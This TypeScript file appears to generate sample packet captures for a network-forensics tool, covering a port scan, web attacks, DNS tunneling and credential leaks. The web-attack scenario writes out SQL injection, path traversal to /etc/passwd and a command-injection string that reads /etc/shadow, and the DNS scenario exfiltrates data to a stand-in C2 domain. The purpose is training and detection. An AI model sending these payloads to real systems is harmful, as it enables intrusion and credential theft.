/**
 * Realistic PCAP Sample Datasets generated as authentic libpcap binary files.
 * Can be parsed by our parser or downloaded and opened directly in Wireshark!
 */

export interface SampleScenario {
  id: string;
  name: string;
  shortDesc: string;
  category: 'Port Scan' | 'Web Attack' | 'DNS Exfil' | 'Credential Leak' | 'Benign';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  attackerIp: string;
  victimIp: string;
  generator: () => ArrayBuffer;
}

// Low level packet builder helper
class PcapBinaryBuilder {
  private packets: { sec: number; usec: number; data: Uint8Array }[] = [];
  private baseTime = Math.floor(Date.now() / 1000) - 300;

  public addPacket(relativeSec: number, data: Uint8Array) {
    const sec = this.baseTime + Math.floor(relativeSec);
    const usec = Math.floor((relativeSec % 1) * 1e6);
    this.packets.push({ sec, usec, data });
  }

  public toArrayBuffer(): ArrayBuffer {
    // 24-byte global header + (16 + data.length) per packet
    let totalSize = 24;
    for (const p of this.packets) {
      totalSize += 16 + p.data.length;
    }

    const buffer = new ArrayBuffer(totalSize);
    const dv = new DataView(buffer);
    const u8 = new Uint8Array(buffer);

    // Global Header (Little Endian 0xd4c3b2a1)
    dv.setUint32(0, 0xd4c3b2a1, true); // magic number
    dv.setUint16(4, 2, true); // major 2
    dv.setUint16(6, 4, true); // minor 4
    dv.setInt32(8, 0, true); // gmt to local
    dv.setUint32(12, 0, true); // sigfigs
    dv.setUint32(16, 65535, true); // snaplen
    dv.setUint32(20, 1, true); // network: 1 = Ethernet

    let offset = 24;
    for (const p of this.packets) {
      const len = p.data.length;
      dv.setUint32(offset, p.sec, true);
      dv.setUint32(offset + 4, p.usec, true);
      dv.setUint32(offset + 8, len, true); // incl_len
      dv.setUint32(offset + 12, len, true); // orig_len
      u8.set(p.data, offset + 16);
      offset += 16 + len;
    }

    return buffer;
  }

  // Construct Ethernet + IPv4 + TCP packet
  public static createTcpPacket(options: {
    srcMac?: number[];
    dstMac?: number[];
    srcIp: string;
    dstIp: string;
    srcPort: number;
    dstPort: number;
    seq: number;
    ack: number;
    flags: { syn?: boolean; ack?: boolean; fin?: boolean; rst?: boolean; psh?: boolean; urg?: boolean };
    payload?: string;
  }): Uint8Array {
    const payloadBytes = options.payload ? new TextEncoder().encode(options.payload) : new Uint8Array(0);
    const tcpLen = 20 + payloadBytes.length;
    const ipTotalLen = 20 + tcpLen;
    const frameLen = 14 + ipTotalLen;

    const frame = new Uint8Array(frameLen);
    const dv = new DataView(frame.buffer);

    // Ethernet (14 bytes)
    const dstMac = options.dstMac || [0x00, 0x0c, 0x29, 0x8a, 0x4f, 0x11];
    const srcMac = options.srcMac || [0x00, 0x50, 0x56, 0xc0, 0x00, 0x08];
    frame.set(dstMac, 0);
    frame.set(srcMac, 6);
    dv.setUint16(12, 0x0800, false); // IPv4 EtherType

    // IPv4 (20 bytes)
    const ipOffset = 14;
    frame[ipOffset] = 0x45; // Version 4, IHL 5 (20 bytes)
    frame[ipOffset + 1] = 0x00; // DSCP/ECN
    dv.setUint16(ipOffset + 2, ipTotalLen, false);
    dv.setUint16(ipOffset + 4, Math.floor(Math.random() * 65535), false); // Identification
    dv.setUint16(ipOffset + 6, 0x4000, false); // Flags: Don't Fragment
    frame[ipOffset + 8] = 64; // TTL
    frame[ipOffset + 9] = 6; // Protocol: TCP
    dv.setUint16(ipOffset + 10, 0, false); // Checksum dummy

    const srcParts = options.srcIp.split('.').map(Number);
    const dstParts = options.dstIp.split('.').map(Number);
    frame.set(srcParts, ipOffset + 12);
    frame.set(dstParts, ipOffset + 16);

    // TCP Header (20 bytes)
    const tcpOffset = ipOffset + 20;
    dv.setUint16(tcpOffset, options.srcPort, false);
    dv.setUint16(tcpOffset + 2, options.dstPort, false);
    dv.setUint32(tcpOffset + 4, options.seq, false);
    dv.setUint32(tcpOffset + 8, options.ack, false);
    frame[tcpOffset + 12] = (5 << 4); // Data offset (5 * 4 = 20 bytes)

    let flagsByte = 0;
    if (options.flags.urg) flagsByte |= 0x20;
    if (options.flags.ack) flagsByte |= 0x10;
    if (options.flags.psh) flagsByte |= 0x08;
    if (options.flags.rst) flagsByte |= 0x04;
    if (options.flags.syn) flagsByte |= 0x02;
    if (options.flags.fin) flagsByte |= 0x01;
    frame[tcpOffset + 13] = flagsByte;

    dv.setUint16(tcpOffset + 14, 29200, false); // Window Size
    dv.setUint16(tcpOffset + 16, 0, false); // Checksum
    dv.setUint16(tcpOffset + 18, 0, false); // Urgent Pointer

    // Payload
    if (payloadBytes.length > 0) {
      frame.set(payloadBytes, tcpOffset + 20);
    }

    return frame;
  }

  // Construct Ethernet + IPv4 + UDP + DNS packet
  public static createDnsPacket(options: {
    srcIp: string;
    dstIp: string;
    srcPort: number;
    dstPort: number;
    queryName: string;
    queryType: number; // 1 = A, 16 = TXT
    isResponse?: boolean;
    answerIp?: string;
  }): Uint8Array {
    // Build DNS wire format
    const labels = options.queryName.split('.');
    const qnameBytes: number[] = [];
    for (const label of labels) {
      qnameBytes.push(label.length);
      for (let i = 0; i < label.length; i++) {
        qnameBytes.push(label.charCodeAt(i));
      }
    }
    qnameBytes.push(0); // terminate

    // DNS Header (12 bytes) + Question (qname + 4 bytes)
    const dnsHeaderLen = 12;
    const questionLen = qnameBytes.length + 4;
    const dnsLen = dnsHeaderLen + questionLen;

    const udpLen = 8 + dnsLen;
    const ipTotalLen = 20 + udpLen;
    const frameLen = 14 + ipTotalLen;

    const frame = new Uint8Array(frameLen);
    const dv = new DataView(frame.buffer);

    // Ethernet
    frame.set([0x00, 0x0c, 0x29, 0x8a, 0x4f, 0x11], 0);
    frame.set([0x00, 0x50, 0x56, 0xc0, 0x00, 0x08], 6);
    dv.setUint16(12, 0x0800, false);

    // IP
    const ipOffset = 14;
    frame[ipOffset] = 0x45;
    dv.setUint16(ipOffset + 2, ipTotalLen, false);
    dv.setUint16(ipOffset + 4, 0x1234, false);
    frame[ipOffset + 8] = 64;
    frame[ipOffset + 9] = 17; // UDP
    frame.set(options.srcIp.split('.').map(Number), ipOffset + 12);
    frame.set(options.dstIp.split('.').map(Number), ipOffset + 16);

    // UDP
    const udpOffset = ipOffset + 20;
    dv.setUint16(udpOffset, options.srcPort, false);
    dv.setUint16(udpOffset + 2, options.dstPort, false);
    dv.setUint16(udpOffset + 4, udpLen, false);
    dv.setUint16(udpOffset + 6, 0, false);

    // DNS
    const dnsOffset = udpOffset + 8;
    dv.setUint16(dnsOffset, 0xa1b2, false); // Transaction ID
    dv.setUint16(dnsOffset + 2, options.isResponse ? 0x8180 : 0x0100, false); // Standard query
    dv.setUint16(dnsOffset + 4, 1, false); // Questions
    dv.setUint16(dnsOffset + 6, options.isResponse ? 1 : 0, false); // Answers

    frame.set(qnameBytes, dnsOffset + 12);
    const qtypeOffset = dnsOffset + 12 + qnameBytes.length;
    dv.setUint16(qtypeOffset, options.queryType, false);
    dv.setUint16(qtypeOffset + 2, 1, false); // Class IN

    return frame;
  }
}

/**
 * 1. Nmap SYN Port Scan Scenario
 */
function generatePortScanPcap(): ArrayBuffer {
  const builder = new PcapBinaryBuilder();
  const attacker = '192.168.1.105';
  const victim = '192.168.1.10';

  const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443];

  let time = 0.05;
  let srcPort = 49152;

  for (const port of ports) {
    // 1. Attacker sends SYN
    const synPkt = PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: victim,
      srcPort: srcPort++,
      dstPort: port,
      seq: 1000 + port,
      ack: 0,
      flags: { syn: true },
    });
    builder.addPacket(time, synPkt);
    time += 0.008;

    // 2. Victim replies
    if (port === 80 || port === 443 || port === 22) {
      // Open port replies SYN, ACK
      const synAckPkt = PcapBinaryBuilder.createTcpPacket({
        srcIp: victim,
        dstIp: attacker,
        srcPort: port,
        dstPort: srcPort - 1,
        seq: 5000 + port,
        ack: 1000 + port + 1,
        flags: { syn: true, ack: true },
      });
      builder.addPacket(time, synAckPkt);
      time += 0.004;

      // Attacker immediately tears down with RST (Stealth Scan)
      const rstPkt = PcapBinaryBuilder.createTcpPacket({
        srcIp: attacker,
        dstIp: victim,
        srcPort: srcPort - 1,
        dstPort: port,
        seq: 1000 + port + 1,
        ack: 0,
        flags: { rst: true },
      });
      builder.addPacket(time, rstPkt);
      time += 0.006;
    } else {
      // Closed port replies RST, ACK
      const rstAckPkt = PcapBinaryBuilder.createTcpPacket({
        srcIp: victim,
        dstIp: attacker,
        srcPort: port,
        dstPort: srcPort - 1,
        seq: 0,
        ack: 1000 + port + 1,
        flags: { rst: true, ack: true },
      });
      builder.addPacket(time, rstAckPkt);
      time += 0.005;
    }
  }

  return builder.toArrayBuffer();
}

/**
 * 2. Web Attack (SQLi & Path Traversal) Scenario
 */
function generateWebAttackPcap(): ArrayBuffer {
  const builder = new PcapBinaryBuilder();
  const attacker = '203.0.113.42';
  const webServer = '192.168.1.80';

  let time = 0.1;

  // Recon HTTP request
  const req1 =
    'GET /login.php HTTP/1.1\r\nHost: portal.company.local\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nAccept: text/html\r\n\r\n';
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: webServer,
      srcPort: 52140,
      dstPort: 80,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: req1,
    })
  );
  time += 0.15;

  // SQL Injection Attempt 1: Tautology bypass
  const req2 =
    "POST /api/auth HTTP/1.1\r\nHost: portal.company.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 48\r\n\r\nusername=admin' OR '1'='1'--&password=password123";
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: webServer,
      srcPort: 52140,
      dstPort: 80,
      seq: req1.length + 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: req2,
    })
  );
  time += 0.22;

  // SQL Injection Attempt 2: UNION SELECT enumeration
  const req3 =
    'GET /products.php?category=1%20UNION%20SELECT%20null,username,password,email%20FROM%20users-- HTTP/1.1\r\nHost: portal.company.local\r\nUser-Agent: sqlmap/1.7.2#dev\r\n\r\n';
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: webServer,
      srcPort: 52142,
      dstPort: 80,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: req3,
    })
  );
  time += 0.18;

  // Path Traversal Attempt
  const req4 =
    'GET /download.php?file=../../../../../../etc/passwd HTTP/1.1\r\nHost: portal.company.local\r\nUser-Agent: curl/7.88.1\r\n\r\n';
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: webServer,
      srcPort: 52144,
      dstPort: 80,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: req4,
    })
  );
  time += 0.15;

  // Command Injection Attempt
  const req5 =
    'POST /cgi-bin/diagnostics.cgi HTTP/1.1\r\nHost: portal.company.local\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nip=127.0.0.1; whoami; id; cat /etc/shadow';
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: attacker,
      dstIp: webServer,
      srcPort: 52146,
      dstPort: 80,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: req5,
    })
  );

  return builder.toArrayBuffer();
}

/**
 * 3. DNS Tunneling & Data Exfiltration Scenario
 */
function generateDnsExfiltrationPcap(): ArrayBuffer {
  const builder = new PcapBinaryBuilder();
  const infectedHost = '10.0.4.15';
  const internalDns = '10.0.0.2';

  // Base64 encoded sensitive snippets disguised as subdomains
  const chunks = [
    'dGhpcyBpcyBhIHRvcCBzZWNyZXQ', // "this is a top secret"
    'ZGF0YWJhc2UgcGFzc3dvcmRzIG', // "database passwords g"
    'YW5kIGN1c3RvbWVyIGNyZWRpdC', // "and customer credit"
    'Y2FyZHMgbnVtYmVycyBleGZpbA', // "cards numbers exfil"
    'c2hhZG93LWJyb2tlcnMtY2hhbg', // "shadow-brokers-chan"
  ];

  let time = 0.2;
  let port = 53120;

  for (const chunk of chunks) {
    const domain = `${chunk}.stage1.shadow-c2.net`;
    const dnsQuery = PcapBinaryBuilder.createDnsPacket({
      srcIp: infectedHost,
      dstIp: internalDns,
      srcPort: port++,
      dstPort: 53,
      queryName: domain,
      queryType: 1, // A record
    });
    builder.addPacket(time, dnsQuery);
    time += 0.45;
  }

  // Suspicious TXT query retrieving C2 commands
  const txtQuery = PcapBinaryBuilder.createDnsPacket({
    srcIp: infectedHost,
    dstIp: internalDns,
    srcPort: port++,
    dstPort: 53,
    queryName: 'cmd.stage1.shadow-c2.net',
    queryType: 16, // TXT record
  });
  builder.addPacket(time, txtQuery);

  return builder.toArrayBuffer();
}

/**
 * 4. Plaintext Credential Exposure Scenario (FTP / HTTP Auth)
 */
function generateCredentialSniffPcap(): ArrayBuffer {
  const builder = new PcapBinaryBuilder();
  const client = '192.168.1.55';
  const ftpServer = '192.168.1.200';
  const intranetServer = '192.168.1.205';

  let time = 0.1;

  // FTP Banner
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: ftpServer,
      dstIp: client,
      srcPort: 21,
      dstPort: 49512,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: '220 ProFTPD 1.3.5 Server (Welcome to Internal Backups)\r\n',
    })
  );
  time += 0.1;

  // FTP USER command
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: client,
      dstIp: ftpServer,
      srcPort: 49512,
      dstPort: 21,
      seq: 1,
      ack: 56,
      flags: { psh: true, ack: true },
      payload: 'USER backup_admin\r\n',
    })
  );
  time += 0.08;

  // FTP PASS command (Plaintext leak!)
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: client,
      dstIp: ftpServer,
      srcPort: 49512,
      dstPort: 21,
      seq: 20,
      ack: 90,
      flags: { psh: true, ack: true },
      payload: 'PASS SuperSecretBackups2026!#\r\n',
    })
  );
  time += 0.3;

  // HTTP Basic Auth header leak
  const basicAuthReq =
    'GET /admin/dashboard HTTP/1.1\r\nHost: finance-vault.local\r\nAuthorization: Basic YWRtaW5pc3RyYXRvcjpQYXNzdzByZDIwMjYh\r\nUser-Agent: Mozilla/5.0\r\n\r\n';
  builder.addPacket(
    time,
    PcapBinaryBuilder.createTcpPacket({
      srcIp: client,
      dstIp: intranetServer,
      srcPort: 54122,
      dstPort: 80,
      seq: 1,
      ack: 1,
      flags: { psh: true, ack: true },
      payload: basicAuthReq,
    })
  );

  return builder.toArrayBuffer();
}

/**
 * 5. Benign Enterprise Network Baseline
 */
function generateBenignPcap(): ArrayBuffer {
  const builder = new PcapBinaryBuilder();
  const workstation = '192.168.1.45';
  const gateway = '192.168.1.1';
  const dnsServer = '1.1.1.1';

  let time = 0.05;

  // 1. DNS query for github.com
  const dns1 = PcapBinaryBuilder.createDnsPacket({
    srcIp: workstation,
    dstIp: dnsServer,
    srcPort: 58211,
    dstPort: 53,
    queryName: 'github.com',
    queryType: 1,
  });
  builder.addPacket(time, dns1);
  time += 0.03;

  // 2. DNS query for api.github.com
  const dns2 = PcapBinaryBuilder.createDnsPacket({
    srcIp: workstation,
    dstIp: dnsServer,
    srcPort: 58212,
    dstPort: 53,
    queryName: 'api.github.com',
    queryType: 1,
  });
  builder.addPacket(time, dns2);
  time += 0.12;

  // 3. Normal TLS Client Hello to github.com
  // Handshake 0x16, TLS 1.2 (0x03, 0x03), length 140, ClientHello (0x01)
  const tlsClientHello = new Uint8Array([
    0x16, 0x03, 0x01, 0x00, 0x5a, 0x01, 0x00, 0x00, 0x56, 0x03, 0x03, 0x11, 0x22, 0x33, 0x44, 0x55,
    0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
    0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x00, 0x08, 0xc0, 0x2f, 0xc0,
    0x30, 0xc0, 0x2b, 0xc0, 0x2c, 0x01, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x0d, 0x00,
    0x00, 0x0a, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d,
  ]);

  const tlsPkt = PcapBinaryBuilder.createTcpPacket({
    srcIp: workstation,
    dstIp: '140.82.121.4',
    srcPort: 58220,
    dstPort: 443,
    seq: 1,
    ack: 1,
    flags: { psh: true, ack: true },
  });
  // append TLS bytes to TCP packet
  const fullTlsPkt = new Uint8Array(tlsPkt.length + tlsClientHello.length);
  fullTlsPkt.set(tlsPkt, 0);
  fullTlsPkt.set(tlsClientHello, tlsPkt.length);
  // update ip total length
  const dv = new DataView(fullTlsPkt.buffer);
  dv.setUint16(16, fullTlsPkt.length - 14, false);

  builder.addPacket(time, fullTlsPkt);
  time += 0.25;

  return builder.toArrayBuffer();
}

export const SAMPLE_SCENARIOS: SampleScenario[] = [
  {
    id: 'nmap-syn-scan',
    name: 'Nmap SYN Port Taraması (Stealth Port Scan)',
    shortDesc: '16 farklı kritik porta yöneltilen TCP SYN yoklamaları ve bayrak analizleri.',
    category: 'Port Scan',
    severity: 'HIGH',
    attackerIp: '192.168.1.105',
    victimIp: '192.168.1.10',
    generator: generatePortScanPcap,
  },
  {
    id: 'web-sqli-lfi',
    name: 'Web Uygulama Saldırısı (SQLi + LFI/Traversal)',
    shortDesc: "UNION SELECT, ' OR '1'='1, /etc/passwd ve komut enjeksiyonu paketleri.",
    category: 'Web Attack',
    severity: 'CRITICAL',
    attackerIp: '203.0.113.42',
    victimIp: '192.168.1.80',
    generator: generateWebAttackPcap,
  },
  {
    id: 'dns-tunneling',
    name: 'DNS Tünelleme ve Veri Kaçırma (DNS Exfiltration)',
    shortDesc: 'Yüksek entropili alt alan adları üzerinden parça parça dışarı sızdırılan veriler.',
    category: 'DNS Exfil',
    severity: 'CRITICAL',
    attackerIp: '10.0.4.15',
    victimIp: '10.0.0.2',
    generator: generateDnsExfiltrationPcap,
  },
  {
    id: 'credential-leak',
    name: 'Açık Parola & FTP/HTTP Basic Auth İfşası',
    shortDesc: 'Şifrelenmemiş ağ trafiğinde açık geçen USER, PASS ve Authorization başlıkları.',
    category: 'Credential Leak',
    severity: 'HIGH',
    attackerIp: '192.168.1.55',
    victimIp: '192.168.1.200',
    generator: generateCredentialSniffPcap,
  },
  {
    id: 'benign-traffic',
    name: 'Normal Kurumsal Ağ Trafiği (Baseline)',
    shortDesc: 'DNS sorguları, standart TLS 1.2 el sıkışması ve zararsız akışlar.',
    category: 'Benign',
    severity: 'LOW',
    attackerIp: '192.168.1.45',
    victimIp: '140.82.121.4',
    generator: generateBenignPcap,
  },
];
